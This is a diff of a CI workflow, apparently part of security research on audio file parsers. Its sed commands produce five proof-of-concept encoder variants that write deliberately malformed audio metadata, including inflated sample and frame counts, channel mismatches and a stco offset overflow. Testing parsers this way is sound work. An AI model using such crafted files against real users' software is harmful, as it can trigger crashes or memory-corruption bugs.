@@ -72,27 +72,29 @@ jobs:
           echo "Creating PoC source files at $(date)"
           # PoC 1: Inflated Sample Count in stsz
           cp encodeme.mm encodeme_poc1.mm
-          sed -i '' 's/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/status = ExtAudioFileWrite(audioFile, 8192, &audioBufferList);/' encodeme_poc1.mm
-          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(1024 * channelNum * sizeof(float))/' encodeme_poc1.mm
+          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/8192/' encodeme_poc1.mm
+          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/ s/44100 * channelNum * sizeof(float) + (rand() % 1000)/1024 * channelNum * sizeof(float)/' encodeme_poc1.mm
           
           # PoC 2: esds Channel Configuration Mismatch
           cp encodeme.mm encodeme_poc2.mm
-          sed -i '' 's/mChannelsPerFrame = channelNum/mChannelsPerFrame = 8/' encodeme_poc2.mm
-          sed -i '' 's/.mNumberChannels = channelNum/.mNumberChannels = 1/' encodeme_poc2.mm
-          sed -i '' 's/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8/' encodeme_poc2.mm
+          sed -i '' '/mChannelsPerFrame = channelNum/ s/channelNum/8/' encodeme_poc2.mm
+          sed -i '' '/mNumberChannels = channelNum/ s/channelNum/1/' encodeme_poc2.mm
+          sed -i '' '/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3/ s/0x3/0x8/' encodeme_poc2.mm
           
           # PoC 3: Xing Header Frame Count Inflation
           cp encodeme.mm encodeme_poc3.mm
-          sed -i '' 's/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/status = ExtAudioFileWrite(audioFile, 2000, &audioBufferList);/' encodeme_poc3.mm
+          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/2000/' encodeme_poc3.mm
           
           # PoC 4: Frame Header Bitrate Mismatch
           cp encodeme.mm encodeme_poc4.mm
-          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
+          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/ s/44100 * channelNum * sizeof(float) + (rand() % 1000)/(144000 \/ 1000 * 64 * channelNum)/' encodeme_poc4.mm
           
           # PoC 5: stco Offset Overflow
           cp encodeme.mm encodeme_poc5.mm
-          sed -i '' 's/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/status = ExtAudioFileWrite(audioFile, 4096, &audioBufferList);/' encodeme_poc5.mm
-          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(100)/' encodeme_poc5.mm
+          sed -i '' '/status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);/ s/44100/4096/' encodeme_poc5.mm
+          sed -i '' '/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/ s/44100 * channelNum * sizeof(float) + (rand() % 1000)/100/' encodeme_poc5.mm
+          
+          ls -l encodeme_poc*.mm
           echo "PoC source files created at $(date)"
 
       # Compile PoC binaries
